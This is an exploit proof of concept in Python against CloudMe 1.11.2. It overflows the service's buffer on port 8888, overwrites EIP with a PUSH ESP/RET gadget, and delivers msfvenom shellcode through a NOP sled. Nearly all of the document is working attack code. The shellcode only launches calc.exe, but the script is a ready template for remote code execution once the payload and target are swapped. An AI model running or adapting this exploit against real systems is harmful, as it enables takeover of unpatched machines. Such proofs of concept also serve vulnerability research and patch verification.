# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xbd\xb6\x95\xb0\xd2\xda\xd0\xd9\x74\x24\xf4"
payload += b"\x58\x29\xc9\xb1\x52\x31\x68\x12\x83\xe8\xfc"
payload += b"\x03\xde\x9b\x52\x27\xe2\x4c\x10\xc8\x1a\x8d"
payload += b"\x75\x40\xff\xbc\xb5\x36\x74\xee\x05\x3c\xd8"
payload += b"\x03\xed\x10\xc8\x90\x83\xbc\xff\x11\x29\x9b"
payload += b"\xce\xa2\x02\xdf\x51\x21\x59\x0c\xb1\x18\x92"
payload += b"\x41\xb0\x5d\xcf\xa8\xe0\x36\x9b\x1f\x14\x32"
payload += b"\xd1\xa3\x9f\x08\xf7\xa3\x7c\xd8\xf6\x82\xd3"
payload += b"\x52\xa1\x04\xd2\xb7\xd9\x0c\xcc\xd4\xe4\xc7"
payload += b"\x67\x2e\x92\xd9\xa1\x7e\x5b\x75\x8c\x4e\xae"
payload += b"\x87\xc9\x69\x51\xf2\x23\x8a\xec\x05\xf0\xf0"
payload += b"\x2a\x83\xe2\x53\xb8\x33\xce\x62\x6d\xa5\x85"
payload += b"\x69\xda\xa1\xc1\x6d\xdd\x66\x7a\x89\x56\x89"
payload += b"\xac\x1b\x2c\xae\x68\x47\xf6\xcf\x29\x2d\x59"
payload += b"\xef\x29\x8e\x06\x55\x22\x23\x52\xe4\x69\x2c"
payload += b"\x97\xc5\x91\xac\xbf\x5e\xe2\x9e\x60\xf5\x6c"
payload += b"\x93\xe9\xd3\x6b\xd4\xc3\xa4\xe3\x2b\xec\xd4"
payload += b"\x2a\xe8\xb8\x84\x44\xd9\xc0\x4e\x94\xe6\x14"
payload += b"\xc0\xc4\x48\xc7\xa1\xb4\x28\xb7\x49\xde\xa6"
payload += b"\xe8\x6a\xe1\x6c\x81\x01\x18\xe7\xa4\xdf\x2c"
payload += b"\x6b\xd0\xdd\x30\x82\x7d\x6b\xd6\xce\x6d\x3d"
payload += b"\x41\x67\x17\x64\x19\x16\xd8\xb2\x64\x18\x52"
payload += b"\x31\x99\xd7\x93\x3c\x89\x80\x53\x0b\xf3\x07"
payload += b"\x6b\xa1\x9b\xc4\xfe\x2e\x5b\x82\xe2\xf8\x0c"
payload += b"\xc3\xd5\xf0\xd8\xf9\x4c\xab\xfe\x03\x08\x94"
payload += b"\xba\xdf\xe9\x1b\x43\xad\x56\x38\x53\x6b\x56"
payload += b"\x04\x07\x23\x01\xd2\xf1\x85\xfb\x94\xab\x5f"
payload += b"\x57\x7f\x3b\x19\x9b\x40\x3d\x26\xf6\x36\xa1"
payload += b"\x97\xaf\x0e\xde\x18\x38\x87\xa7\x44\xd8\x68"
payload += b"\x72\xcd\xe8\x22\xde\x64\x61\xeb\x8b\x34\xec"
payload += b"\x0c\x66\x7a\x09\x8f\x82\x03\xee\x8f\xe7\x06"
payload += b"\xaa\x17\x14\x7b\xa3\xfd\x1a\x28\xc4\xd7"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
